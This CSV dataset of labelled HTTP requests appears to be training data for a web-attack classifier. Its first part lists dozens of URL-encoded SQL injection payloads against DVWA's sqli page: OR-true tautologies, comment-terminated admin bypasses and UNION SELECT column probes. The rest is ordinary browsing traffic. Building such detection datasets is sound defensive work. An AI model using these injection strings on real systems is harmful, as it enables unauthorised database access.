Method,Path,Body,Single_q,Double_q,Dashes,Braces,Spaces,Bad_Words,class
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29%3D%282%29LimIT%281%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%20true%20oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%28true%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%20true%20oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,2,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,1,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%28true%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%2f%2A%2A%2ftrue%2f%2A%2A%2foR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%28%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%272%27LiKE%272%27oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,6,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29oR%282%29LiKE%282%29oR%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%222%22LiKE%222%22oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,6,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,2,1,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,2,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29oR%282%29LiKE%282%29oR%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,3,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%2C5--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20UniON%20SElecT%201%2C2%2C3%2C4%2C5%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%2C4%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,2,1,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%2C4%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29UniON%28SElecT%281%29%2C2%2C3%2C4%2C5%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,0,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20UniON%20SElecT%201%2C2--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20UniON%20SElecT%201%2C2%2C3--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,2,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20UniON%20SElecT%201%2C2%2C3%2C4--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,4,2,bad
GET,/,,0,0,0,0,0,0,good
GET,/js/main.js,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/favicon.ico,,0,0,0,0,0,0,good
GET,/index.html,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/American_History_Class_Pag.htm,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/APGOV_Class_Page.htm,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/Government_Class_Page.htm,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/const/fed/fed_51.html,,0,0,0,0,0,0,good
GET,/ammem/constRedir.html,,0,0,0,0,0,0,good
GET,/ammem/help/constRedir.html,,0,0,0,0,0,0,good
GET,/APGOV_Course_Req.htm,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/sitemap1.html,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/Lesson_2_Notes.htm,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/images/sft_approved_banners/sft_logo_medium.gif,,0,0,0,0,0,0,good
GET,/,,0,0,0,0,0,0,good
GET,/favicon.ico,,0,0,0,0,0,0,good
GET,/login.jsp,,0,0,0,0,0,0,good
POST,/doLogin,uid=admin&passw=admin&btnSubmit=Login,0,0,0,0,0,0,good
GET,/bank/main.jsp,,0,0,0,0,0,0,good
GET,/bank/showAccount?listAccounts=800001,,0,0,0,0,0,0,good
GET,/status_check.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,good
GET,/,,0,0,0,0,0,0,good
GET,/ajax/libs/jquery/1.9.1/jquery.min.js,,0,0,0,0,0,0,good
GET,/eluminate.js,,0,0,0,0,0,0,good
GET,/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.tools.min.js?rev=4.5.9&ver=4.1.1,,0,0,0,0,0,0,good
GET,/common/coremetrics/cmcustom.js,,0,0,0,0,0,0,good
GET,/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?rev=4.5.9&ver=4.1.1,,0,0,0,0,0,0,good
GET,/js/shared.js,,0,0,0,0,0,0,good
GET,/wp-content/plugins/lightbox-plus/js/jquery.colorbox.1.5.9.js?ver=1.5.9,,0,0,0,0,0,0,good
GET,/logout.jsp,,0,0,0,0,0,0,good
GET,/wp-content/plugins/js_composer/assets/js/js_composer_front.js?ver=4.4.2,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195789690&vn1=4.23.201&ec=utf-8&vn2=e4.0&pi=Targeted%20Attacks%20Homepage&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com%2F&tid=6&cg=Targeted%20Attacks&rnd=1693202189831&pc=Y&jv=1.8.5&np0=Chromium%20PDF%20Plugin&np1=Chromium%20PDF%20Viewer&je=n&sw=1450&sh=816&pd=24&tz=-5.5,,0,0,0,0,7,0,good
GET,/lang.html,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/menu.html,,0,0,0,0,0,0,good
GET,/footer-share.html,,0,0,0,0,0,0,good
GET,/wp-content/themes/starter_theme/images/favicon.png,,0,0,0,0,0,0,good
GET,/about-the-game.html,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195789690&vn1=4.23.201&ec=utf-8&pi=Targeted%20Attacks%20Homepage&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com&tid=8&ti=1693195797576&hr=%2Fabout-the-game.html,,0,0,0,0,2,0,good
GET,/common/coremetrics/cmcustom.js,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195798076&vn1=4.23.201&ec=utf-8&vn2=e4.0&pi=Targeted%20Attacks%20About&rf=http%3A%2F%2Ftargetedattacks.trendmicro.com%2F&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com%2Fabout-the-game.html&tid=1&cg=Targeted%20Attacks&rnd=1693200363168,,0,0,0,0,3,0,good
GET,/us/enterprise/challenges/advance-targeted-attacks/index.html,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195798076&vn1=4.23.201&ec=utf-8&pi=Targeted%20Attacks%20About&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com&tid=8&ti=1693195800041&hr=http%3A%2F%2Fwww.trendmicro.com%2Fus%2Fenterprise%2Fchallenges%2Fadvance-targeted-attacks%2Findex.html,,0,0,0,0,2,0,good
GET,/us/enterprise/challenges/advance-targeted-attacks/index.html,,0,0,0,0,0,0,good
GET,/en_us/business/products/network/deep-discovery.html,,0,0,0,0,0,0,good
GET,/en_us/business/products/network/advanced-threat-protection.html,,0,0,0,0,0,0,good
GET,/us/enterprise/security-risk-management/deep-discovery/index.html,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195798076&vn1=4.23.201&ec=utf-8&pi=Targeted%20Attacks%20About&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com&tid=8&ti=1693195815244&hr=http%3A%2F%2Fwww.trendmicro.com%2Fus%2Fenterprise%2Fsecurity-risk-management%2Fdeep-discovery%2Findex.html,,0,0,0,0,2,0,good
GET,/us/enterprise/security-risk-management/deep-discovery/index.html,,0,0,0,0,0,0,good
GET,/en_us/business/products/network/deep-discovery.html,,0,0,0,0,0,0,good
GET,/en_us/business/products/network/advanced-threat-protection.html,,0,0,0,0,0,0,good
GET,/content/dam/trendmicro/global/en/core/images/logos/tm-logo-red-white-t.svg,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.sync.js,,0,0,0,0,0,0,good
GET,/consent/821060e3-3f9c-4a2f-8613-8e0db4841f79/OtAutoBlock.js,,0,0,0,0,0,0,good
GET,/scripttemplates/otSDKStub.js,,0,0,0,0,0,0,good
GET,/consent/821060e3-3f9c-4a2f-8613-8e0db4841f79/821060e3-3f9c-4a2f-8613-8e0db4841f79.json,,0,0,0,0,0,0,good
GET,/scripts/bundles/search-script.js,,0,0,0,0,0,0,good
GET,/vinfo/us/security/news/,,0,0,0,0,0,0,good
GET,/vinfo/us/security/news/,,0,0,0,0,0,0,good
GET,/cm?ci=99999999&st=1693195798076&vn1=4.23.201&ec=utf-8&pi=Targeted%20Attacks%20About&ul=http%3A%2F%2Ftargetedattacks.trendmicro.com&tid=8&ti=1693195820945&hr=http%3A%2F%2Fwww.trendmicro.com%2Fvinfo%2Fus%2Fsecurity%2Fnews%2F,,0,0,0,0,2,0,good
GET,/etc.clientlibs/clientlibs/granite/jquery.min.js,,0,0,0,0,0,0,good
GET,/etc.clientlibs/clientlibs/granite/utils.min.js,,0,0,0,0,0,0,good
GET,/content/dam/trendmicro/global/en/core/images/logos/tm-logo-red-white-t.svg,,0,0,0,0,0,0,good
GET,/vinfo/js/analytics.js?v1,,0,0,0,0,0,0,good
GET,/etc.clientlibs/clientlibs/granite/jquery/granite.min.js,,0,0,0,0,0,0,good
GET,/libs/granite/csrf/token.json,,0,0,0,0,0,0,good
GET,/scripts/bundles/search-script.js,,0,0,0,0,0,0,good
GET,/etc.clientlibs/trendmicro/editableTemplateComponents/content/footer/v1/footer/clientLibs.min.js,,0,0,0,0,0,0,good
GET,/etc.clientlibs/trendmicro/clientlibs/trendmicro-core-2/clientlibs/vendor.min.js,,0,0,0,0,0,0,good
GET,/etc.clientlibs/trendmicro/clientlibs/trendmicro-core-2/clientlibs.min.js,,0,0,0,0,0,0,good
GET,/etc.clientlibs/trendmicro/clientlibs/trendmicro-core-2/clientlibs/header-footer.min.js,,0,0,0,0,0,0,good
GET,/vinfo/js/nav-script-1-2.js,,0,0,0,0,0,0,good
GET,/vinfo/js/customPageScripts.js?Ver3.1,,0,0,0,0,0,0,good
GET,/vinfo/js/eqlcolList.js,,0,0,0,0,0,0,good
GET,/vinfo/js/rssfeedgetter2017.js?v=1.0,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.sync.js,,0,0,0,0,0,0,good
GET,/vinfo/cloudlink/datatables/jquery.dataTables.min.js,,0,0,0,0,0,0,good
GET,/vinfo/js/scroller.js,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.js,,0,0,0,0,0,0,good
GET,/vinfo/js/TEX.tooltip.js,,0,0,0,0,0,0,good
GET,/vinfo/js/viewportchecker.js,,0,0,0,0,0,0,good
GET,/vinfo/js/share.js,,0,0,0,0,0,0,good
GET,/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js,,0,0,0,0,0,0,good
GET,/analytics.js,,0,0,0,0,0,0,good
GET,/boomerang/KL7L2-AE63W-6L875-PUGB2-GU2BB,,0,0,0,0,0,0,good
GET,/gtm.js?id=GTM-MT6DHL8,,0,0,0,0,0,0,good
POST,/j/collect?v=1&_v=j101&a=1126891149&t=pageview&_s=1&dl=https%3A%2F%2Fwww.trendmicro.com%2Fvinfo%2Fus%2Fsecurity%2Fnews%2F&dr=http%3A%2F%2Ftargetedattacks.trendmicro.com%2F&ul=en-us&de=UTF-8&dt=Security%20News&sd=24-bit&sr=1450x816&vp=1434x701&je=0&_u=IEBAAEABAAAAACAAI~&jid=433246887&gjid=1004166594&cid=108868238.1693195823&tid=UA-15678759-2&_gid=60004868.1693195823&_r=1&_slc=1&z=614053172,,0,0,0,0,1,0,good
GET,/gtag/js?id=G-9RTX7DD265&cx=c&_slc=1,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.115.js?utv=ut4.49.202109201636,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.22.js?utv=ut4.49.201510262117,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.69.js?utv=ut4.49.202006041752,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.151.js?utv=ut4.49.202109071517,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.81.js?utv=ut4.49.202305162129,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.29.js?utv=ut4.49.201510262117,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.9.js?utv=ut4.49.201510262117,,0,0,0,0,0,0,good
GET,/iframe_api,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.145.js?utv=ut4.49.202305162129,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.187.js?utv=ut4.49.202306210404,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.18.js?utv=ut4.49.201510262117,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.117.js?utv=ut4.49.202109291943,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.189.js?utv=ut4.49.202305082144,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.171.js?utv=ut4.49.202308081722,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.43.js?utv=ut4.49.201510262117,,0,0,0,0,0,0,good
GET,/utag/trendmicro/nabucms/prod/utag.75.js?utv=ut4.49.201608171750,,0,0,0,0,0,0,good
GET,/plugins/ua/ec.js,,0,0,0,0,0,0,good
GET,/plugins/ua/linkid.js,,0,0,0,0,0,0,good
GET,/gtm.js?id=GTM-TXGNM2&l=dataLayer,,0,0,0,0,0,0,good
GET,/utag/tiqapp/utag.v.js?a=trendmicro/nabucms/202308081951&cb=1693195823288,,0,0,0,0,0,0,good
GET,/gtag/js?id=G-4502MK3B94&l=dataLayer&cx=c,,0,0,0,0,0,0,good
GET,/gtag/js?id=G-4502MK3B94,,0,0,0,0,0,0,good
POST,/j/collect?t=dc&aip=1&_r=3&v=1&_v=j101&tid=UA-15678759-2&cid=108868238.1693195823&jid=433246887&gjid=1004166594&_gid=60004868.1693195823&_u=IEBAAEAAAAAAACAAI~&z=2055525552,,0,0,0,0,0,0,good
POST,/g/collect?v=2&tid=G-9RTX7DD265&gtm=45je38n0&_p=1126891149&gdid=dYmQxMT&ul=en-us&sr=1450x816&cid=108868238.1693195823&uaa=&uab=&uafvl=&uamb=0&uam=&uap=&uapv=&uaw=0&_eu=ABAI&_s=1&dl=https%3A%2F%2Fwww.trendmicro.com%2Fvinfo%2Fus%2Fsecurity%2Fnews%2F&dr=http%3A%2F%2Ftargetedattacks.trendmicro.com%2F&dt=Security%20News&sid=1693195823&sct=1&seg=0&en=page_view&_fv=1&_ss=1&_ee=1,,0,0,0,0,1,0,good
POST,/j/collect?v=1&_v=j101&a=1126891149&t=pageview&cu=&_s=1&dl=https%3A%2F%2Fwww.trendmicro.com%2Fvinfo%2Fus%2Fsecurity%2Fnews%2F&dr=http%3A%2F%2Ftargetedattacks.trendmicro.com%2F&ul=en-us&de=UTF-8&dt=Security%20News&sd=24-bit&sr=1450x816&vp=1434x701&je=0&_u=aGDACEIrBAAAACAMIg~&cid=108868238.1693195823&tid=UA-44592531-1&_gid=60004868.1693195823&_slc=1&cd15=https%3A%2F%2Fwww.trendmicro.com%2Fvinfo%2Fus%2Fsecurity%2Fnews%2F&z=1645260475,,0,0,0,0,1,0,good
GET,/s/player/c153b631/www-widgetapi.vflset/www-widgetapi.js,,0,0,0,0,0,0,good
GET,/ga.js,,0,0,0,0,0,0,good
GET,/6si.min.js,,0,0,0,0,0,0,good
GET,/include/1693196100000/sv2uuh4gw3ms.js,,0,0,0,0,0,0,good
GET,/quant.js,,0,0,0,0,0,0,good
GET,/en_US/fbevents.js,,0,0,0,0,0,0,good
GET,/uwt.js,,0,0,0,0,0,0,good
